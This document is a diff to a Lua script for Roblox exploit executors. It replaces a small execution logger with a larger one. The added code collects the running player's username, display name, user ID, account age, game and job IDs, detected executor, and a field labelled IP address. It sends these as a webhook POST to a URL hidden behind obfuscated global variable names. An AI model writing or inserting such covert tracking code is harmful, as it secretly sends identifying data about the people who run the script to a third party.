@@ -1,45 +1,72 @@
-pcall(function()
-   local data = {
-       ["embeds"] = {
-           {
-               ["title"] = game:GetService("Players").LocalPlayer.Name,
-	        ["description"] = getgenv().LxXQdfeQtXCYfrfquauWoiDlnvRm1vRCKnp2UdHz .." executed."
-           }
-       }
-   }
-
-   if syn then
-       local response = syn.request(
-           {
-               Url = getgenv().D0tzbPK1Ky2x9M6buRekG0SOhqx9KgNt7kkJUnQz,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif request then
-       local response = request(
-           {
-               Url = getgenv().D0tzbPK1Ky2x9M6buRekG0SOhqx9KgNt7kkJUnQz,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif http_request then
-       local response = http_request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   end
-end)
+local req = syn.request
+local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+local useraa = "user-agent"
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+local data = {
+    ["username"]  = "Blizzi Log",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = "LOG"
+            },
+            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
+            ["description"] = "**Executed in game: **"..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
+            ["color"] = 229954,
+            ["fields"] = {
+                {
+                    ["name"] = "Game ID",
+                    ["value"] = "**Game ID: **"..game.PlaceId,
+                },
+                {
+                    ["name"] = "Player Name",
+                    ["value"] = "**Username: **"..game.Players.LocalPlayer.Name,
+                },
+                {
+                    ["name"] = "Player DisplayName",
+                    ["value"] = "**Display Name: **"..game.Players.LocalPlayer.DisplayName,
+                },
+                {
+                    ["name"] = "Player ID:",
+                    ["value"] = "**ID: **"..game.Players.LocalPlayer.UserId,
+                },                {
+                    ["name"] = "Account Age",
+                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
+                },
+                {
+                    ["name"] = "Exploit",
+                    ["value"] = "```"..getexploit().."```"
+                },
+                {
+                    ["name"] = "Job Id",
+                    ["value"] = "```"..game.JobId.."```"
+                },
+                {
+                    ["name"] = "IP Adress",
+                    ["value"] = "```"..getgenv().LxXQdfeQtXCYfrfquauWoiDlnvRm1vRCKnp2UdHz.."```"
+                },
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+        }
+    }
+}
+local Post = req({Url = getgenv().D0tzbPK1Ky2x9M6buRekG0SOhqx9KgNt7kkJUnQz,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
